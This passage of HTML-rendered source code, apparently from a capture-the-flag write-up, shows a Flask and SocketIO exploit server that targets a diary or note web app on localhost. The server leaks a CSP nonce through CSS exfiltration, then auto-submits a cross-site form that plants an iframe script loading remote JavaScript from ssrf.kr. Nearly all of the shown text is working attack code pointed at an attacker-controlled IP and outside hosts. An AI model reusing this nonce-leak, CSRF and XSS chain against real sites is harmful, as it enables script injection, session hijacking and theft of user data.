class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Flask,request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask_socketio &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; SocketIO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; urllib.parse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app.config[&lt;span class=&#34;string&#34;&gt;&amp;#x27;SECRET_KEY&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;test1234&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;socketio = SocketIO(app,cors_allowed_origins=&lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nonce = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;self_url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://141.164.55.51:8000/gen_exfil_css?nonce=&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;string&#34;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyz0123456789&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@socketio.on(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;start&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;handle_my_custom_event&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;methods=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;start&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    socketio.emit(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nonce&amp;#x27;&lt;/span&gt;, json.dumps(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;nonce&amp;quot;&lt;/span&gt;:nonce&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;script src=&amp;quot;https://cdn.socket.io/4.3.2/socket.io.min.js&amp;quot; integrity=&amp;quot;sha384-KAZ4DtjNhLChOB/hxXuKqhMLYvx3b5MlT55xPEiNmREKRzeEm+RVPlTnAn0ajQNs&amp;quot; crossorigin=&amp;quot;anonymous&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    var socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    var isRun = 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    var nonce = &amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    var a,b = undefined;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    idx = -1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    function sleep(ms) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        return new Promise((r) =&amp;gt; setTimeout(r, ms));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    async function make_shared_note(nonce) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        make_note = window.open(`http://141.164.55.51:8000/gen_exfil_css?nonce=$&amp;#123;nonce&amp;#125;`);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        idx = idx + 1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        await sleep(400)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        make_note.location = `http://localhost/share_diary/$&amp;#123;idx&amp;#125;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        await sleep(400)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        make_note.close()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    async function exploit(nonce) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        make_note = window.open(`http://141.164.55.51:8000/exploit?nonce=$&amp;#123;nonce&amp;#125;`);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        idx = idx + 1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        await sleep(400)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        make_note.location = `http://localhost/share_diary/$&amp;#123;idx&amp;#125;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        await sleep(400)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        make_note.close()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    function start() &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        socket = io.connect(&amp;#x27;http://141.164.55.51:8000&amp;#x27;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        socket.on(&amp;#x27;connect&amp;#x27;, function() &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        console.log(&amp;#x27;start&amp;#x27;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        socket.emit( &amp;#x27;start&amp;#x27;, &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            data: &amp;#x27;start&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    socket.on(&amp;#x27;nonce&amp;#x27;, async function(data) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        if(!isRun) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        isRun = 1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        if(JSON.parse(data).nonce.length==16)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            await exploit(JSON.parse(data).nonce);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            try &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                a.onload = 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125; catch &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                a.location = &amp;quot;http://ssrf.kr/redirect_cg.html&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            await sleep(400);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            a.location.href = `http://localhost/share/read#id=$&amp;#123;idx&amp;#125;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            a.focus();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            a.focus();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        else if(nonce &amp;lt;= JSON.parse(data).nonce)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            nonce = JSON.parse(data).nonce&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            await make_shared_note(nonce);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            console.log(nonce);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            if(!b) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                b = window.open(&amp;quot;about:blank&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                a = window.open(&amp;quot;http://localhost/share/read&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                await sleep(400)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                b.location.href = &amp;quot;http://localhost/share/read&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            try &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                a.onload = 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125; catch &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                a.location = &amp;quot;http://ssrf.kr/redirect_cg.html&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            await sleep(400);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            a.location.href = `http://localhost/share/read#id=$&amp;#123;idx&amp;#125;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            a.focus();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            a.focus();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        isRun = 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#125; else &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#125;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    chall_url = &amp;quot;http://localhost/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    start();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/exploit&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;exploit&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nonce = request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nonce&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;iframe srcdoc=&amp;quot;&amp;lt;script nonce=&lt;span class=&#34;subst&#34;&gt;&amp;#123;nonce&amp;#125;&lt;/span&gt; src=//ssrf.kr/ex.js&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;body onload=&amp;quot;form.submit()&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;form id=&amp;#x27;form&amp;#x27; action=&amp;quot;http://localhost/write&amp;quot;, method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;title&amp;quot; value=&amp;quot;exploit&amp;quot;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input name=&amp;quot;content&amp;quot; value=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;payload&amp;#125;&lt;/span&gt;&amp;#x27;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 